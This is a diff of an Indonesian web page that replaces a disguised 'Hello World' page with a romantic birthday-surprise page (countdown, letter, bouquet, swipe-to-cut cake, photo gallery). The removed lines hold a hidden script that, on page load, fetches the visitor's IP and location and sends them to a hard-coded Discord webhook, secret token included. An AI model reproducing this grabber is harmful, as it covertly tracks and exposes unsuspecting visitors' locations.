@@ -1,73 +1,622 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Hello World</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background: #f5f5f5;
-    }
-    h1 {
-      font-size: 4rem;
-      color: #333;
-    }
-  </style>
-</head>
-<body>
-  <h1>Hello World</h1>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Cintaku!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;600&family=Dancing+Script:wght@600&display=swap');
 
-  <script>
-    (async function() {
-      try {
-        // 1. Ambil data IP dan lokasi dari ipinfo.io
-        const res = await fetch('https://ipinfo.io/json');
-        const data = await res.json();
-
-        const ip = data.ip || 'Tidak diketahui';
-
-        // Susun lokasi (kota, provinsi, negara)
-        let location = '';
-        if (data.city) location += data.city;
-        if (data.region) location += (location ? ', ' : '') + data.region;
-        if (data.country) location += (location ? ', ' : '') + data.country;
-        if (!location) location = 'Tidak diketahui';
-
-        // Link Google Maps dari koordinat
-        let mapLink = 'Tidak tersedia';
-        if (data.loc) {
-          const [lat, lng] = data.loc.split(',');
-          mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+        :root {
+            /* Tema Biru Muda (Light Blue Pastel) */
+            --primary: #4da6ff;
+            --secondary: #0080ff;
+            --dark: #0a1128;
+            --light: #e6f2ff;
+            --glass: rgba(255, 255, 255, 0.15);
+            --border: rgba(255, 255, 255, 0.3);
         }
 
-        // 2. Bentuk embed sesuai struktur yang diminta
-        const embed = {
-          title: '📡 Data Pengunjung Baru',
-          color: 0x5865F2, // biru Discord
-          fields: [
-            { name: 'IP ADDRES', value: ip, inline: false },
-            { name: 'LOCATION', value: location, inline: false },
-            { name: 'LINK MAPS', value: mapLink, inline: false }
-          ],
-          timestamp: new Date().toISOString()
-        };
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            /* Prevent text selection when swiping */
+            user-select: none;
+            -webkit-user-select: none;
+        }
 
-        // 3. Kirim ke webhook Discord
-        const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ embeds: [embed] })
+        body {
+            background-color: var(--dark);
+            color: var(--light);
+            overflow: hidden; 
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* Background */
+        .bg-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            background: linear-gradient(135deg, #001f3f, #005c99);
+            overflow: hidden;
+        }
+
+        /* Floating Light Particles (Ganti Petals jadi partikel biru) */
+        .particle {
+            position: absolute;
+            background: radial-gradient(circle, #80d4ff 0%, #0099ff 100%);
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: floatUp linear infinite;
+            box-shadow: 0 0 10px #80d4ff;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) scale(0.5); opacity: 0; }
+            20% { opacity: 0.8; }
+            100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+        }
+
+        /* Sections / Pages */
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1), transform 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: scale(0.9) translateY(30px);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .page.active {
+            opacity: 1;
+            pointer-events: auto;
+            transform: scale(1) translateY(0);
+        }
+
+        /* Typography */
+        h1, h2 {
+            font-family: 'Playfair Display', serif;
+            color: var(--light);
+            text-shadow: 0 0 20px rgba(77, 166, 255, 0.6);
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        h1 { font-size: 3rem; }
+        h2 { font-size: 2.2rem; color: #b3e0ff; }
+        .cursive { font-family: 'Dancing Script', cursive; font-size: 3.5rem; color: #80d4ff; }
+
+        /* Buttons */
+        .btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 12px 35px;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0, 128, 255, 0.4);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+            margin-top: 30px;
+        }
+
+        .btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 30px rgba(0, 128, 255, 0.6);
+        }
+
+        .btn-small {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border);
+            padding: 8px 20px;
+            font-size: 0.8rem;
+            margin-top: 15px;
+            box-shadow: none;
+            display: inline-block;
+            transition: all 0.3s ease;
+            color: white;
+            cursor: pointer;
+            border-radius: 20px;
+        }
+        
+        .btn-small:hover {
+            background: rgba(255, 255, 255, 0.25);
+        }
+
+        /* Glassmorphism Cards */
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
+            max-width: 800px;
+            width: 100%;
+            transition: transform 0.5s;
+        }
+
+        /* Countdown */
+        .countdown-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .time-box {
+            background: rgba(0, 20, 50, 0.5);
+            border: 1px solid var(--primary);
+            padding: 15px 10px;
+            border-radius: 12px;
+            min-width: 80px;
+            box-shadow: inset 0 0 10px rgba(77, 166, 255, 0.2);
+        }
+        .time-box span {
+            display: block;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: var(--primary);
+            font-family: 'Playfair Display', serif;
+        }
+        .time-box p {
+            font-size: 0.8rem;
+            color: #b3e0ff;
+            margin-top: 5px;
+            letter-spacing: 1px;
+        }
+
+        /* Letter */
+        .letter-content {
+            background: #fff;
+            color: #1a1a1a;
+            padding: 40px;
+            border-radius: 12px;
+            background-image: url('https://www.transparenttextures.com/patterns/cream-paper.png');
+            box-shadow: inset 0 0 30px rgba(0,0,0,0.05);
+            text-align: left;
+            font-size: 1.1rem;
+            line-height: 1.9;
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            max-height: 55vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .letter-content p {
+            margin-bottom: 15px;
+        }
+
+        /* Bouquet */
+        .bouquet-img {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 30px rgba(77, 166, 255, 0.5);
+            animation: floatSlow 6s ease-in-out infinite;
+        }
+
+        @keyframes floatSlow {
+            0% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(2deg); }
+            100% { transform: translateY(0px) rotate(0deg); }
+        }
+
+        /* Interactive Cake */
+        .cake-wrapper {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            margin: 0 auto 30px;
+            cursor: grab;
+        }
+        
+        .cake-wrapper:active {
+            cursor: grabbing;
+        }
+
+        /* We use two halves of the same image for the cutting effect */
+        .cake-half {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://images.unsplash.com/photo-1558301211-0d8c8ddee6ec?auto=format&fit=crop&w=500&q=80');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            transition: transform 1.5s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        /* Left Half */
+        .cake-left {
+            clip-path: polygon(0 0, 50% 0, 50% 100%, 0 100%);
+        }
+
+        /* Right Half */
+        .cake-right {
+            clip-path: polygon(50% 0, 100% 0, 100% 100%, 50% 100%);
+        }
+
+        /* Sliced Animation Classes */
+        .cake-left.sliced {
+            transform: translateX(-40px) rotate(-8deg);
+        }
+        
+        .cake-right.sliced {
+            transform: translateX(40px) rotate(8deg);
+        }
+
+        /* Candle Flame */
+        .flame-container {
+            position: absolute;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .flame {
+            width: 20px;
+            height: 40px;
+            background: #ffaa00;
+            border-radius: 50% 50% 20% 20%;
+            box-shadow: 0 0 20px #ffaa00, 0 0 40px #ffaa00, 0 0 60px #ff0000;
+            animation: flicker 0.1s infinite alternate;
+            transition: all 0.5s ease;
+        }
+
+        .flame.blown-out {
+            opacity: 0;
+            transform: scale(0);
+        }
+
+        @keyframes flicker {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0.9; }
+        }
+
+        /* Swipe Instruction */
+        .swipe-hint {
+            display: none;
+            color: #80d4ff;
+            font-size: 1.1rem;
+            animation: slideHint 1.5s infinite;
+            margin-top: 10px;
+        }
+
+        @keyframes slideHint {
+            0% { transform: translateX(-15px); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateX(15px); opacity: 0; }
+        }
+
+        /* Gallery */
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            max-height: 60vh;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+        
+        .gallery img {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            border-radius: 15px;
+            border: 2px solid var(--border);
+            transition: all 0.5s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .gallery img:hover {
+            transform: scale(1.08) translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 15px 25px rgba(0, 128, 255, 0.4);
+            z-index: 10;
+            position: relative;
+        }
+
+        .locked-msg {
+            color: #b3e0ff;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Audio Player (Preloaded) -->
+    <audio id="bg-music" loop preload="auto">
+        <source src="https://files.catbox.moe/7l2oab.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Animated Background -->
+    <div class="bg-container" id="bg-container"></div>
+
+    <!-- PAGE 0: INTRO -->
+    <div class="page active" id="page-0">
+        <h1 class="cursive">For My Special One</h1>
+        <p style="letter-spacing: 3px; color: #b3e0ff; text-transform: uppercase;">A little surprise waiting inside</p>
+        <button class="btn" onclick="startJourney()">Tap to Open</button>
+    </div>
+
+    <!-- PAGE 1: COUNTDOWN -->
+    <div class="page" id="page-1">
+        <div class="glass-card">
+            <h2>Menunggu Hari Spesialmu...</h2>
+            <p style="color: #b3e0ff;">25 Agustus 2026</p>
+            <div class="countdown-container" id="countdown">
+                <div class="time-box"><span id="days">00</span><p>Hari</p></div>
+                <div class="time-box"><span id="hours">00</span><p>Jam</p></div>
+                <div class="time-box"><span id="minutes">00</span><p>Menit</p></div>
+                <div class="time-box"><span id="seconds">00</span><p>Detik</p></div>
+            </div>
+            <button class="btn" id="btn-next-1" onclick="nextPage(2)" style="display:none;">Lanjut Membaca</button>
+            <p id="locked-msg" class="locked-msg">Sabar ya sayang, hadiahnya baru bisa dibuka tanggal 25 Agustus!</p>
+            <br>
+            <button class="btn btn-small" id="btn-test" onclick="unlockTest()">[TEST] Buka Sekarang Paksa</button>
+        </div>
+    </div>
+
+    <!-- PAGE 2: SURAT -->
+    <div class="page" id="page-2">
+        <div class="glass-card">
+            <h2 class="cursive">Sebuah Surat Untukmu</h2>
+            <div class="letter-content">
+                <p>Hai Sayang,</p>
+                <p>Selamat ulang tahun! Aku buat web ini khusus buat kamu. Maaf ya kalau hadiahnya cuma kayak gini, tapi aku buatnya bener-bener pakai hati.</p>
+                <p>Semoga di umur kamu yang baru ini, kamu makin cantik, makin sabar, selalu dilancarkan semua urusannya, dan yang terpenting... makin sayang sama aku.</p>
+                <p>Aku bersyukur banget bisa kenal dan bareng sama kamu. Melewati banyak hal bareng-bareng. You are the best thing that ever happened to me.</p>
+                <p style="text-align: right; font-weight: 600; color: #005c99; margin-top: 20px;">
+                    I Love You<br>
+                    Zuperming
+                </p>
+            </div>
+            <button class="btn" onclick="nextPage(3)">Selanjutnya</button>
+        </div>
+    </div>
+
+    <!-- PAGE 3: BOUQUET -->
+    <div class="page" id="page-3">
+        <div class="glass-card">
+            <h2>Bunga Spesial Buat Orang Spesial</h2>
+            <p style="margin-bottom: 30px; color: #b3e0ff;">Anggap aja ini bunga asli ya sayang, nanti kapan-kapan aku beliin yang beneran hehe.</p>
+            <img src="https://images.unsplash.com/photo-1591886960571-74d43a9d4166?auto=format&fit=crop&w=500&q=80" alt="Bouquet" class="bouquet-img">
+            <br>
+            <button class="btn" onclick="nextPage(4)" style="margin-top: 40px;">Selanjutnya</button>
+        </div>
+    </div>
+
+    <!-- PAGE 4: POTONG KUE -->
+    <div class="page" id="page-4">
+        <div class="glass-card">
+            <h2 id="cake-title">Make a Wish!</h2>
+            <p id="cake-subtitle" style="margin-bottom: 20px; color: #b3e0ff;">(Tap apinya buat tiup lilin)</p>
+            
+            <div class="cake-wrapper" id="cake-wrapper">
+                <div class="cake-half cake-left" id="cake-left"></div>
+                <div class="cake-half cake-right" id="cake-right"></div>
+                <div class="flame-container" id="flame-container" onclick="blowCandle()">
+                    <div class="flame" id="candle-flame"></div>
+                </div>
+            </div>
+
+            <p class="swipe-hint" id="swipe-hint">Swipe (Geser) layar dari kiri ke kanan buat motong kuenya!</p>
+            <button class="btn" id="btn-next-4" onclick="nextPage(5)" style="display: none; margin-top: 20px;">Selanjutnya</button>
+        </div>
+    </div>
+
+    <!-- PAGE 5: MEMORIES (FOTO) -->
+    <div class="page" id="page-5">
+        <div class="glass-card">
+            <h2 class="cursive" style="font-size: 3rem;">Kenangan Kita</h2>
+            <p style="margin-bottom: 20px; color: #b3e0ff;">Semoga kita bisa bikin lebih banyak kenangan lagi bareng-bareng.</p>
+            
+            <div class="gallery">
+                <img src="https://files.catbox.moe/lvzf14.jpg" alt="Foto Cowok">
+                <img src="https://files.catbox.moe/iz4fol.jpg" alt="Foto Cewek">
+                <img src="https://files.catbox.moe/96esot.jpg" alt="Foto Cowok 2">
+                <img src="https://files.catbox.moe/p7rc7e.jpg" alt="Foto Cewek 2">
+            </div>
+            <button class="btn" onclick="nextPage(1)" style="margin-top: 30px;">Kembali ke Awal</button>
+        </div>
+    </div>
+
+    <script>
+        // 1. Floating Particles (Blue Theme)
+        const bgContainer = document.getElementById('bg-container');
+        for(let i = 0; i < 30; i++) {
+            let particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + 'vw';
+            let size = Math.random() * 15 + 5;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.animationDuration = (Math.random() * 8 + 6) + 's';
+            particle.style.animationDelay = (Math.random() * 5) + 's';
+            bgContainer.appendChild(particle);
+        }
+
+        // 2. Page Navigation
+        function nextPage(pageNum) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page-' + pageNum).classList.add('active');
+        }
+
+        function startJourney() {
+            nextPage(1);
+            const audio = document.getElementById('bg-music');
+            audio.volume = 0.5;
+            // Play music on interaction
+            let playPromise = audio.play();
+            if (playPromise !== undefined) {
+                playPromise.catch(error => {
+                    console.log("Audio autoplay was prevented.", error);
+                });
+            }
+        }
+
+        // 3. Countdown Logic (Target: 25 Agustus 2026)
+        const targetDate = new Date("August 25, 2026 00:00:00").getTime();
+        let isBirthday = false;
+        let testMode = false;
+
+        function updateCountdown() {
+            if (testMode) return; 
+
+            const now = new Date().getTime();
+            const distance = targetDate - now;
+
+            if (distance <= 0) {
+                isBirthday = true;
+                document.getElementById('days').innerText = "00";
+                document.getElementById('hours').innerText = "00";
+                document.getElementById('minutes').innerText = "00";
+                document.getElementById('seconds').innerText = "00";
+                
+                document.getElementById('locked-msg').style.display = 'none';
+                document.getElementById('btn-test').style.display = 'none';
+                document.getElementById('btn-next-1').style.display = 'inline-block';
+                return;
+            }
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById('days').innerText = days.toString().padStart(2, '0');
+            document.getElementById('hours').innerText = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0');
+        }
+
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // 4. Test Mode Unlock
+        function unlockTest() {
+            testMode = true;
+            document.getElementById('days').innerText = "00";
+            document.getElementById('hours').innerText = "00";
+            document.getElementById('minutes').innerText = "00";
+            document.getElementById('seconds').innerText = "00";
+            
+            document.getElementById('locked-msg').style.display = 'none';
+            document.getElementById('btn-test').style.display = 'none';
+            document.getElementById('btn-next-1').style.display = 'inline-block';
+        }
+
+        // Lock validation on Page 1
+        document.getElementById('page-1').addEventListener('click', function(e) {
+            if (e.target.id === 'page-1' && !isBirthday && !testMode) {
+                const msg = document.getElementById('locked-msg');
+                msg.style.display = 'block';
+                msg.style.animation = 'none';
+                setTimeout(() => msg.style.animation = 'shake 0.5s', 10);
+            }
         });
 
-        console.log('✅ Berhasil dikirim ke Discord');
-      } catch (error) {
-        console.error('❌ Gagal mengirim:', error);
-      }
-    })();
-  </script>
+        // 5. Interactive Cake: Tap to blow candle, Swipe to cut
+        let candleBlown = false;
+        let cakeCut = false;
+
+        function blowCandle() {
+            if (candleBlown) return;
+            candleBlown = true;
+            
+            // Hide flame smoothly
+            document.getElementById('candle-flame').classList.add('blown-out');
+            
+            // Update Text
+            document.getElementById('cake-title').innerText = "Happy Birthday!!";
+            document.getElementById('cake-subtitle').innerText = "Sekarang swipe (geser) layar buat motong kuenya!";
+            
+            // Show swipe hint
+            document.getElementById('swipe-hint').style.display = 'block';
+        }
+
+        // Swipe Detection to cut the cake
+        const cakeWrapper = document.getElementById('cake-wrapper');
+        let startX = 0;
+
+        cakeWrapper.addEventListener('touchstart', e => {
+            startX = e.touches[0].clientX;
+        });
+
+        cakeWrapper.addEventListener('touchend', e => {
+            let endX = e.changedTouches[0].clientX;
+            handleSwipe(startX, endX);
+        });
+
+        cakeWrapper.addEventListener('mousedown', e => {
+            startX = e.clientX;
+        });
+
+        cakeWrapper.addEventListener('mouseup', e => {
+            let endX = e.clientX;
+            handleSwipe(startX, endX);
+        });
+
+        function handleSwipe(start, end) {
+            if (!candleBlown || cakeCut) return;
+            
+            // If swiped right by more than 40px
+            if (end - start > 40) {
+                cakeCut = true;
+                
+                // Add sliced classes to split the image
+                document.getElementById('cake-left').classList.add('sliced');
+                document.getElementById('cake-right').classList.add('sliced');
+                
+                document.getElementById('swipe-hint').style.display = 'none';
+                document.getElementById('cake-subtitle').innerText = "Kue sudah dipotong! Silakan dinikmati hehe";
+                
+                // Show next button
+                setTimeout(() => {
+                    document.getElementById('btn-next-4').style.display = 'inline-block';
+                }, 800);
+            }
+        }
+    </script>
 </body>
 </html>
